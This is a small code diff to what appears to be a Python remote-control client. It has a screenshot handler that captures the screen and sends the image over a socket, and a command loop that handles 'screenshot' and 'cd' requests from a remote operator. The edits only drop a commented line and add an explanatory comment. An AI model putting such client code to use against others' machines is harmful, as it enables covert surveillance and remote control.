@@ -25,7 +25,6 @@ class ScreenshotHandler:
 
     def take_screenshot(self):
         s = pyautogui.screenshot("/tmp/ss.png")
-        #data = base64.urlsafe_b64encode(s.tobytes())
         filetosend = open("/tmp/ss.png", "rb")
         data = filetosend.read()
         os.remove("/tmp/ss.png")
@@ -123,7 +122,7 @@ class Client:
             elif self.args[0] == "screenshot":
                 s = ScreenshotHandler(self.sock)
 
-            elif self.args[0] == "cd":
+            elif self.args[0] == "cd": # Here we need to "implement" cd or else the directory change won't persist.
 
 
                 if "~" in self.args[1]:
